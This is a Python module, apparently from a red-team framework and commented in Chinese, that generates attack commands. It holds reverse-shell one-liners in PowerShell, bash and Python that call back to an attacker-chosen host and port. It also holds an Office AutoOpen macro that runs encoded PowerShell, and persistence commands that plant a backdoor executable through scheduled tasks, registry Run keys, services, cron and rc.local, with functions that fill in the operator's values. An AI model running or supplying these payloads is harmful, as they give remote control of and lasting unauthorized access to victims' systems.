# -*- coding: utf-8 -*-
"""
red_execution_phase.py — 红队阶段3：执行。

功能:
    - 命令执行框架（shell 命令执行 / 反弹 shell 模板）
    - 代码执行框架（powershell / bash 一行命令 / office 宏模板）
    - 持久化框架（计划任务 / 注册表 / 服务 / 启动项）
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

SHELL_TEMPLATES = {
    "powershell_reverse": (
        "powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient"
        "('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object"
        " -c 32 -io 10 System.Text.Encoding]::ASCII).GetString($b,0,$i);"
        "$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII)."
        "GetBytes($r);$s.Write($sb,0,$sb.Length)}}\""),
    "bash_reverse": (
        "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"),
    "python_reverse": (
        "python -c 'import socket,subprocess,os;s=socket.socket("
        "socket.AF_INET,socket.SOCK_STREAM);s.connect((\"LHOST\",LPORT));"
        "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        "subprocess.call([\"/bin/sh\",\"-i\"])'"),
}

MACRO_TEMPLATE = (
    "Sub AutoOpen()\n"
    "  CreateObject(\"Wscript.Shell\").Run \"powershell -nop -e "
    "<BASE64>\", 0\n"
    "End Sub")

PERSISTENCE_TEMPLATES = {
    "windows_scheduled_task": {
        "os": "windows", "name": "计划任务",
        "command": "schtasks /create /tn \"Update\" /tr "
                   "\"C:\\\\backdoor.exe\" /sc onlogon /ru System",
    },
    "windows_registry_run": {
        "os": "windows", "name": "注册表启动项",
        "command": "reg add HKCU\\Software\\Microsoft\\Windows\\"
                   "CurrentVersion\\Run /v Update /t REG_SZ "
                   "/d C:\\backdoor.exe",
    },
    "windows_service": {
        "os": "windows", "name": "Windows 服务",
        "command": "sc create UpdateSvc binPath= C:\\backdoor.exe "
                   "start= auto",
    },
    "linux_cron": {
        "os": "linux", "name": "cron 计划任务",
        "command": "(crontab -l; echo \"@reboot /tmp/bd.sh\")|crontab -",
    },
    "linux_rc_local": {
        "os": "linux", "name": "rc.local 启动项",
        "command": "echo '/tmp/bd.sh &' >> /etc/rc.local && chmod +x "
                   "/etc/rc.local",
    },
}


@dataclass
class ExecResult:
    module: str = ""
    target: str = ""
    command: str = ""
    rendered: str = ""
    os: str = "windows"
    error: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {"module": self.module, "target": self.target,
                "command": self.command, "rendered": self.rendered,
                "os": self.os, "error": self.error}


class RedExecutionPhase:
    """红队阶段3：执行。"""

    # ------------------------------------------------------------------ #
    def command_exec_templates(self, lhost: str = "10.10.10.1",
                               lport: int = 4444) -> Dict[str, Any]:
        out = []
        for key, tpl in SHELL_TEMPLATES.items():
            rendered = tpl.replace("LHOST", lhost).replace(
                "LPORT", str(lport))
            out.append({"id": key, "rendered": rendered,
                        "lhost": lhost, "lport": lport})
        return {"shells": out, "count": len(out)}

    # ------------------------------------------------------------------ #
    def code_exec_macro(self, payload_b64: str = "") -> ExecResult:
        """生成 Office 宏代码执行模板。"""
        rendered = MACRO_TEMPLATE.replace("<BASE64>", payload_b64 or "PAYLOAD")
        return ExecResult(module="macro", command="Office AutoOpen",
                         rendered=rendered, os="windows")

    def code_exec_powershell(self, command: str = "Get-ChildItem C:\\"
                            ) -> ExecResult:
        return ExecResult(module="powershell", command="powershell -nop",
                          rendered=f"powershell -nop -c \"{command}\"",
                          os="windows")

    def code_exec_bash(self, command: str = "id") -> ExecResult:
        return ExecResult(module="bash", command="/bin/bash -c",
                          rendered=f"bash -c '{command}'", os="linux")

    # ------------------------------------------------------------------ #
    def persistence_list(self) -> Dict[str, Any]:
        items = [{"id": k, **v} for k, v in PERSISTENCE_TEMPLATES.items()]
        return {"templates": items, "count": len(items)}

    def persistence_render(self, kind: str = "windows_scheduled_task",
                           payload_path: str = "") -> ExecResult:
        tpl = PERSISTENCE_TEMPLATES.get(kind)
        if not tpl:
            return ExecResult(module="persistence",
                              error=f"未知持久化类型: {kind}")
        cmd = tpl["command"]
        if payload_path:
            cmd = cmd.replace("C:\\backdoor.exe", payload_path) \
                     .replace("/tmp/bd.sh", payload_path)
        return ExecResult(module="persistence", command=tpl["name"],
                          rendered=cmd, os=tpl["os"])

    # ------------------------------------------------------------------ #
    def execute_demo(self) -> Dict[str, Any]:
        """框架演示：列出全部模板与渲染样例。"""
        shells = self.command_exec_templates()
        pers = self.persistence_list()
        macro = self.code_exec_macro().to_dict()
        return {"shells": shells, "persistence": pers,
                "macro": macro,
                "ts": time.strftime("%Y-%m-%d %H:%M:%S")}


_default: Optional[RedExecutionPhase] = None


def get_red_execution_phase() -> RedExecutionPhase:
    global _default
    if _default is None:
        _default = RedExecutionPhase()
    return _default
